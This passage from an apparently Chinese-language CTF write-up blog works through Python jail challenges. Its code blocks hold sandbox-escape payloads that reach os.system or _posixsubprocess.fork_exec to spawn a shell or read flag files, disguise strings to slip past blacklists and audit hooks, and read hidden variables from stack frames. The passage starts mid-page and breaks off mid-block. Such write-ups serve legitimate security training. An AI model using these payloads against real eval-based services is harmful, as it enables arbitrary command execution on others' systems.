| _____  | | __ _| | _____ </span></span><br><span class="line"><span class="string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><p>先走 1 通道拿到 key 然后到 2 验证</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/oXO6yphTng82Wrt.png" alt="image.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/cF5eb8VijKOnsyP.png" alt="image.png"></p><h3 id="lke-lke-lke"><a class="markdownIt-Anchor" href="#lke-lke-lke">#</a> l@ke l@ke l@ke</h3><p>还是两步走，通道 1，长度不超过 6 来获取 key，通道 2 验证 key</p><p>对于通道 1，我们调用 <code>help()</code>  进入函数，输入 <code>server</code>  查看 key<br><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/kAnQM9qpgbdLOF6.png" alt="image.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/HYlOA8tLzQqD3x5.png" alt="image.png"></p><h3 id="calc_jail_beginner_level4"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level4">#</a> calc_jail_beginner_level4</h3><p>将 <code>'__loader__', '__import__', 'compile', 'eval', 'exec', 'chr'</code>  等函数都 ban 掉了 后面又将单引号、双引号、反斜杠、反引号给 ban 了</p><p>尝试使用之前的 SSTI 注入 先查询 object 类下的子类 查看可以使用的模块</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure></div><p>发现可以使用 os 模块</p><p>禁用了 chr，可以使用 byte []</p><p>payload：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/C2ihAFwdWP8kR7r.png" alt="image.png"></p><p>另外，同样是使用 bytes () 函数 猜测 flag 文件的位置和名字 可以直接对  <code>open('flag').read()</code>  进行转化 直接读取 flag</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(bytes([102,108,97,103]).decode()).read()</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level405"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level405">#</a> calc_jail_beginner_level4.0.5</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/xKwXD1flzSsPWyB.png" alt="image.png"></p><h3 id="calc_jail_beginner_level41"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level41">#</a> calc_jail_beginner_level4.1</h3><p>没有 hint 了，接下来就是脑洞的碰撞了</p><p>连接靶机</p><p><code>Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and </code> ,&quot;,’ `</p><p>bytes [] 被 ban 了，就需要用 type 了，二者的关系：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system == [bytes([115,121,115,116,101,109]).decode()]</span><br><span class="line">&quot;system&quot; == (type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()</span><br></pre></td></tr></table></figure></div><p>利用下面 payload 可以执行 ls，同理可以 <code>cat flag</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/ov8fnNjB6uL1Dza.png" alt="image.png"></p><p>也可以利用 Show subclasses with tuple 找到 bytes 类：结果为 bytes 类的索引为 6</p><p>可以构造 payload 拿到 sh</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/cCetM5DzxWAsQK8.png" alt="image.png"></p><p>也可以利用 <code>__doc__</code> getshell</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level42"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level42">#</a> calc_jail_beginner_level4.2</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure></div><p>加号被 ban 了，可以用 <code>__add__</code> 代替</p><p>跟 4.1 类似执行 <code>system(&quot;flag_y0u_CaNt_FiNd_mE&quot;)</code></p><p>payload：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/xXR5rLibdj3B26q.png" alt="image.png"></p><p>也可以继续用 4.1 的利用 bytes 索引的 payload</p><p>和利用 <code>__doc__</code> 的方法，但需要利用 <code>join</code>  的拼接方式</p><p>payload：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level43"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level43">#</a> calc_jail_beginner_level4.3</h3><p><code>Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and </code> ,&quot;,’,+`</p><p>type 也被 ban 了，还可以利用 <code>list(dict(system=114514))[0]</code>  获取 <code>system</code>  这个字符串</p><p>因此直接执行 <code>system(sh)</code></p><p>payload：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/sBJqXm4ic39ZnxO.png" alt="image.png"></p><p>并且，上面两道题的后两种方法还可以用</p><h3 id="calc_jail_beginner_level51"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level51">#</a> calc_jail_beginner_level5.1</h3><p>尝试之后发现 <code>import</code> 、 <code>open</code>  都被 ban 了</p><p>尝试 <code>dir()</code> ：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/vCoTzceO1lr8d43.png" alt="image.png"></p><p>一路跟进</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/pR4b81VMro3AYzF.png" alt="image.png"></p><p>发现 encode，直接利用</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/aU1losjKCz6pn7q.png" alt="image.png"></p><h3 id="lake-lake-lake-2"><a class="markdownIt-Anchor" href="#lake-lake-lake-2">#</a> lake lake lake</h3><p>hook 了很多函数</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>,<span class="string">&#x27;code.__new__&#x27;</span>,<span class="string">&#x27;function.__new__&#x27;</span>,<span class="string">&#x27;cpython._PySys_ClearAuditHooks&#x27;</span>,<span class="string">&#x27;open&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br></pre></td></tr></table></figure></div><p>分析一下猜数字的函数</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> game_score</span><br></pre></td></tr></table></figure></div><p>可知我们需要猜出 <code>right_guesser_question_answer</code>  才可以获取 flag，同时还给 <code>sys.stdout</code> 、 <code>sys.seterr</code>  进行了重定向，调用 print 无法输出。</p><p>一些解释：<a class="link" href="https://blog.csdn.net/MTbaby/article/details/53159053">python 的 sys.stdout 重定向 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>但是可以通过 <code>__import__(&quot;sys&quot;).__stdout__.write()</code>  去输入。</p><p>那么我们的思路就是，读文件，然后输出</p><p>用 os.open 打开文件，然后用 os.read 读文件，当然也可以用 <code>__import__('io').open(&quot;flag&quot;).read()</code></p><p>payload：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(__import__(&quot;os&quot;).read(__import__(&quot;os&quot;).open(&quot;flag&quot;,__import__(&quot;os&quot;).O_RDONLY), 0x114).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/LWZ5ypkOlGCn3d7.png" alt="image.png"></p><h3 id="lak3-lak3-lak3"><a class="markdownIt-Anchor" href="#lak3-lak3-lak3">#</a> lak3 lak3 lak3</h3><p>直接把 io、system 之类的函数全给 hook 掉了，还把上一题的 open 等更多的函数给 ban 了</p><p>也是猜数字，答案在 <code>right_guesser_question_answer</code> ，想办法获取该值</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/B16ZFDXtSVz9R3h.png" alt="image.png"></p><p>可以使用 <code>__import__(&quot;sys&quot;).__stdout__.write</code>  去进行标准输出，</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&#x27;sys&#x27;)._getframe(1)))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/xqvCfP4M93aW1Uu.png" alt="image.png"></p><p>这里的 frame 对象指向了’/home/ctf/./server.py’这个 file，那么直接调用 f_locals 属性查看变量</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&#x27;sys&#x27;)._getframe(1).f_locals))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/1bPN2qLovwr9S5T.png" alt="image.png"></p><p>最终 payload：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int(str(__import__(&#x27;sys&#x27;)._getframe(1).f_locals[&quot;right_guesser_question_answer&quot;]))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/SL9hMJGDt3C8scq.png" alt="image.png"></p><h3 id="sfe-safeeval"><a class="markdownIt-Anchor" href="#sfe-safeeval">#</a> s@Fe safeeval</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Black <span class="type">List</span>:</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line"><span class="string">&#x27;POP_TOP&#x27;</span>,<span class="string">&#x27;ROT_TWO&#x27;</span>,<span class="string">&#x27;ROT_THREE&#x27;</span>,<span class="string">&#x27;ROT_FOUR&#x27;</span>,<span class="string">&#x27;DUP_TOP&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BUILD_LIST&#x27;</span>,<span class="string">&#x27;BUILD_MAP&#x27;</span>,<span class="string">&#x27;BUILD_TUPLE&#x27;</span>,<span class="string">&#x27;BUILD_SET&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BUILD_CONST_KEY_MAP&#x27;</span>, <span class="string">&#x27;BUILD_STRING&#x27;</span>,<span class="string">&#x27;LOAD_CONST&#x27;</span>,<span class="string">&#x27;RETURN_VALUE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;STORE_SUBSCR&#x27;</span>, <span class="string">&#x27;STORE_MAP&#x27;</span>,<span class="string">&#x27;LIST_TO_TUPLE&#x27;</span>, <span class="string">&#x27;LIST_EXTEND&#x27;</span>, <span class="string">&#x27;SET_UPDATE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;DICT_UPDATE&#x27;</span>, <span class="string">&#x27;DICT_MERGE&#x27;</span>,<span class="string">&#x27;UNARY_POSITIVE&#x27;</span>,<span class="string">&#x27;UNARY_NEGATIVE&#x27;</span>,<span class="string">&#x27;UNARY_NOT&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UNARY_INVERT&#x27;</span>,<span class="string">&#x27;BINARY_POWER&#x27;</span>,<span class="string">&#x27;BINARY_MULTIPLY&#x27;</span>,<span class="string">&#x27;BINARY_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_FLOOR_DIVIDE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BINARY_TRUE_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_MODULO&#x27;</span>,<span class="string">&#x27;BINARY_ADD&#x27;</span>,<span class="string">&#x27;BINARY_SUBTRACT&#x27;</span>,<span class="string">&#x27;BINARY_LSHIFT&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BINARY_RSHIFT&#x27;</span>,<span class="string">&#x27;BINARY_AND&#x27;</span>,<span class="string">&#x27;BINARY_XOR&#x27;</span>,<span class="string">&#x27;BINARY_OR&#x27;</span>,<span class="string">&#x27;MAKE_FUNCTION&#x27;</span>, <span class="string">&#x27;CALL_FUNCTION&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">some code:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> pwnlib.util.safeeval <span class="keyword">as</span> safeeval</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(expr(input_data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expr</span>(<span class="params">n</span>):</span><br><span class="line"><span class="keyword">if</span> TURING_PROTECT_SAFE:</span><br><span class="line">m = safeeval.test_expr(n, blocklist_codes)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">eval</span>(m)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> safeeval.expr(n)</span><br></pre></td></tr></table></figure></div><p>对比下 pwnlib.util.safeeval 中的代码，可以看到 blacklist 中多了两个可以执行的 opcode</p><blockquote><p>MAKE_FUNCTION<br>CALL_FUNCTION</p></blockquote><p>很显然出题人想让我们执行函数调用 / 编写。</p><p>第一时间能想到的是 lambda，然后直接调用就行了，payload 为：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lambda:os.system(&#x27;cat flag&#x27;))()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/rqJ3FA4O5Dkp76U.png" alt="image.png"></p><h3 id="calc_jail_beginner_level6"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level6">#</a> calc_jail_beginner_level6</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> _                _                           _       _ _   _                _   __  </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | / /  </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_  </span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                     </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                                                                              </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">Welcome to the python jail</span></span><br><span class="line"><span class="string">Let&#x27;</span>s have an beginner jail of calc</span><br><span class="line">Enter your expression <span class="keyword">and</span> I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">White <span class="built_in">list</span> of audit hook ===&gt; builtins.<span class="built_in">input</span>,builtins.<span class="built_in">input</span>/result,<span class="built_in">exec</span>,<span class="built_in">compile</span></span><br><span class="line">Some code of python jail:</span><br><span class="line"></span><br><span class="line">  dict_global = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">      <span class="keyword">except</span> EOFError:</span><br><span class="line">          <span class="built_in">print</span>()</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">      <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line">  </span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure></div><p>这题已经几乎把所有的 hook 给 ban 掉了。参考这个 writeup：<a class="link" href="https://ctftime.org/writeup/31883">https://ctftime.org/writeup/31883 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>也就是利用 <code>_posixsubprocess.fork_exec</code>  来实现 RCE。不过需要注意，不同的 python 版本的 <code>_posixsubprocess.fork_exec</code>  接受的参数个数可能不一样：例如本地 WSL 的 python 版本为 3.8.10，该函数接受 17 个参数；而远程 python 版本为 3.10.6，该函数和上面的 writeup 接受 21 个参数。</p><p>而且注意到，直接 <code>import _posixsubprocess</code>  的话，会触发 <code>audit hook</code> ：</p><p>可以通过如下方法绕过：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[&#x27;__loader__&#x27;].load_module(&#x27;_posixsubprocess&#x27;)</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;)</span><br></pre></td></tr></table></figure></div><p>而且因为是多次 exec，所以我们可以输入多行代码：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1,*(os.pipe()), False, False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/lo3wgxhXz1eri89.png" alt="image.png"></p><h3 id="calc_jail_beginner_level61"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level61">#</a> calc_jail_beginner_level6.1</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  _                _                           _       _ _   _                _   __</span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | / /</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span></span><br><span 